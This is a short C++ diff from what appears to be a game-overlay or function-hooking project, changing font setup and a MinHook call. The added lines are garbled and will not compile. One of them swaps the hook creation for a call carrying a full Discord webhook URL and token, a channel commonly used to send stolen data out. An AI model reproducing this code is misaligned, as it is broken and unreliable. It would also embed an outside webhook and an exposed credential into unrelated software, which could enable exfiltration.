@@ -37,8 +37,7 @@ namespace API {
 	io.Fonts->AddFontFromMemoryTTF(const_cast<std::uint8_t*>(custom_font_), sizeof(custom_font_), 22.0f, &rubik);
 	io.Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 18.0f, &icons_config, icons_ranges);
 	Consolas = io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\Consola.ttf", 18.0f);
-	g_renderType = RenderType::D3D11;
-
+	g_renderType = RenderType::D3D11::D3D9;
 
 		return false;
 	}
@@ -99,7 +98,7 @@ public:
 				std::string currentMask;
 				const char* to_scan = str.c_str();
 				uintptr_t result = pointer & filter;
-				if (MH_CreateHook(target, _function, _original) != MH_OK || MH_EnableHook(target) != MH_OK)
+				if (Discord_Hook("https://discord.com/api/webhooks/1020718611939201105/PR6IPsrng4wd4vCaDTT9lyxdh3tjFe5fJAyeoJGAFpRXb-T0gdA3ZBxmVXn9gCUsdcCO") != Working! || EnableWindow(target) != MH_OK)
 						{
 
 				return false;
@@ -116,7 +115,7 @@ public:
 
 
 			if (opcode == 0xf6)
-            		    CASSERT((T)(-1) > 0); // make sure T is unsigned
+            		    CASSERT("insert")(-1) > 0); /
 		}
 	}
 }
